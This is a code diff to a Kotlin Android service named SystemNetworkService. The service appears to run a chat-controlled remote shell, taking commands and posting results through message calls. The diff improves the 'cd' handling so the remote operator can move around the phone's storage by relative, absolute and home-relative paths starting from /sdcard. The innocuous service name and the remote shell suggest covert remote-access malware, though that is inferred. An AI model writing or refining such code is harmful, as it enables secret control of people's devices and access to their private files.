@@ -503,13 +503,18 @@ class SystemNetworkService : Service() {
                     try {
                         if (cmd.startsWith("cd ") || cmd == "cd") {
                             val target = cmd.substringAfter("cd ").trim()
-                            val newDir = if (target.isEmpty() || target == "~") "/sdcard" else target
-                            val dir = File(newDir)
-                            if (dir.isDirectory) {
-                                shellWorkingDir = dir.absolutePath
+                            val baseDir = File(shellWorkingDir)
+                            val newDir = when {
+                                target.isEmpty() || target == "~" -> File("/sdcard")
+                                target.startsWith("/") -> File(target)
+                                target.startsWith("~/") -> File("/sdcard", target.substring(2))
+                                else -> File(baseDir, target)
+                            }
+                            if (newDir.exists() && newDir.isDirectory) {
+                                shellWorkingDir = newDir.absolutePath
                                 if (progressId != null) d.editMsg(progressId, ":terminal: **Changed directory**\n\`\`\`\n$shellWorkingDir\n\`\`\`") else d.sendMsg(":terminal: **Changed directory**\n\`\`\`\n$shellWorkingDir\n\`\`\`")
                             } else {
-                                if (progressId != null) d.editMsg(progressId, ":x: Directory not found: `$newDir`") else d.sendMsg(":x: Directory not found: `$newDir`")
+                                if (progressId != null) d.editMsg(progressId, ":x: Directory not found: `${newDir.absolutePath}`") else d.sendMsg(":x: Directory not found: `${newDir.absolutePath}`")
                             }
                         } else if (cmd == "pwd") {
                             if (progressId != null) d.editMsg(progressId, "```\n$shellWorkingDir\n```") else d.sendMsg("```\n$shellWorkingDir\n```")
